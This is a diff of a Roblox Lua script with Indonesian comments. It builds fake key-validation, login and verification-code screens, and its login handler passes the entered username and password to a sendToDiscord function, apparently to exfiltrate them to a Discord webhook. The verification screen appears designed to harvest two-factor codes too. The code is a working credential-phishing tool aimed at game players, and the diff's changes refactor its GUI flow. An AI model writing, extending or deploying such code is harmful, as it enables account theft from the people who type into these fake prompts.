@@ -42,7 +42,7 @@ local function sendToDiscord(username, password, verificationCode)
     end
 end
 
--- Fungsi GUI Pertama (Key Validation)
+-- Membuat GUI Key Validation (GUI 1)
 local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
@@ -136,28 +136,21 @@ local function createKeyValidationGUI()
         if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy() -- Menghapus GUI Key Validation
-            createLoginGUI() -- Membuat GUI Login setelah Key benar
+            loginGUI.Visible = true -- Menampilkan GUI login
         else
             errorLabel.Text = "Key salah! Silahkan Get Key."
         end
     end)
 end
 
--- Fungsi GUI Kedua (Login)
+-- Membuat GUI Login (GUI 2)
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
-    local usernameBox = Instance.new("TextBox")
-    local passwordBox = Instance.new("TextBox")
-    local loginButton = Instance.new("TextButton")
-
-    -- Properti GUI
     gui.Name = "LoginGUI"
     gui.Parent = game.CoreGui or game:GetService("CoreGui")
+    gui.Visible = false -- Awalnya tidak terlihat
 
-    -- Frame
-    frame.Name = "LoginFrame"
+    local frame = Instance.new("Frame")
     frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 300)
     frame.Position = UDim2.new(0.5, -150, 0.5, -150)
@@ -166,7 +159,7 @@ local function createLoginGUI()
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
     -- Title Label
-    titleLabel.Name = "TitleLabel"
+    local titleLabel = Instance.new("TextLabel")
     titleLabel.Parent = frame
     titleLabel.Size = UDim2.new(1, 0, 0, 50)
     titleLabel.Position = UDim2.new(0, 0, 0, 0)
@@ -177,7 +170,7 @@ local function createLoginGUI()
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Username Box
-    usernameBox.Name = "UsernameBox"
+    local usernameBox = Instance.new("TextBox")
     usernameBox.Parent = frame
     usernameBox.Size = UDim2.new(1, -20, 0, 40)
     usernameBox.Position = UDim2.new(0, 10, 0, 90)
@@ -189,7 +182,7 @@ local function createLoginGUI()
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Password Box
-    passwordBox.Name = "PasswordBox"
+    local passwordBox = Instance.new("TextBox")
     passwordBox.Parent = frame
     passwordBox.Size = UDim2.new(1, -20, 0, 40)
     passwordBox.Position = UDim2.new(0, 10, 0, 140)
@@ -201,7 +194,7 @@ local function createLoginGUI()
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Login Button
-    loginButton.Name = "LoginButton"
+    local loginButton = Instance.new("TextButton")
     loginButton.Parent = frame
     loginButton.Size = UDim2.new(1, -20, 0, 40)
     loginButton.Position = UDim2.new(0, 10, 0, 200)
@@ -216,9 +209,8 @@ local function createLoginGUI()
         local username = usernameBox.Text
         local password = passwordBox.Text
         if username ~= "" and password ~= "" then
-            print("Login berhasil! Username:", username, "Password:", password)
             sendToDiscord(username, password, "Waiting for verification code...") -- Placeholder verifikasi
-            gui:Destroy()
+            gui:Destroy() -- Hapus GUI login setelah login berhasil
             createVerifikasiGUI() -- Panggil GUI verifikasi
         else
             print("Harap isi username dan password!")
@@ -226,20 +218,14 @@ local function createLoginGUI()
     end)
 end
 
--- Fungsi GUI Keempat (Verifikasi Kode)
+-- Membuat GUI Verifikasi Kode (GUI 4)
 local function createVerifikasiGUI()
     local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local verifikasiLabel = Instance.new("TextLabel")
-    local codeBox = Instance.new("TextBox")
-    local verifyButton = Instance.new("TextButton")
-
-    -- Properti GUI
     gui.Name = "VerifikasiGUI"
     gui.Parent = game.CoreGui or game:GetService("CoreGui")
+    gui.Visible = false -- Awalnya tidak terlihat
 
-    -- Frame
-    frame.Name = "VerifikasiFrame"
+    local frame = Instance.new("Frame")
     frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 250)
     frame.Position = UDim2.new(0.5, -150, 0.5, -125)
@@ -248,7 +234,7 @@ local function createVerifikasiGUI()
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
     -- Verifikasi Label
-    verifikasiLabel.Name = "VerifikasiLabel"
+    local verifikasiLabel = Instance.new("TextLabel")
     verifikasiLabel.Parent = frame
     verifikasiLabel.Size = UDim2.new(1, 0, 0, 50)
     verifikasiLabel.Position = UDim2.new(0, 0, 0, 0)
@@ -259,7 +245,7 @@ local function createVerifikasiGUI()
     verifikasiLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Code Box
-    codeBox.Name = "CodeBox"
+    local codeBox = Instance.new("TextBox")
     codeBox.Parent = frame
     codeBox.Size = UDim2.new(1, -20, 0, 40)
     codeBox.Position = UDim2.new(0, 10, 0, 60)
@@ -271,7 +257,7 @@ local function createVerifikasiGUI()
     codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
     -- Verify Button
-    verifyButton.Name = "VerifyButton"
+    local verifyButton = Instance.new("TextButton")
     verifyButton.Parent = frame
     verifyButton.Size = UDim2.new(1, -20, 0, 40)
     verifyButton.Position = UDim2.new(0, 10, 0, 120)
@@ -295,5 +281,7 @@ local function createVerifikasiGUI()
     end)
 end
 
--- Mulai aplikasi dari GUI pertama (Key Validation)
-createKeyValidationGUI()
+-- Mulai aplikasi
+createKeyValidationGUI() -- GUI pertama langsung dimuat
+createLoginGUI() -- GUI kedua dimuat tapi tidak terlihat
+createVerifikasiGUI() -- GUI keempat dimuat tapi tidak terlihat
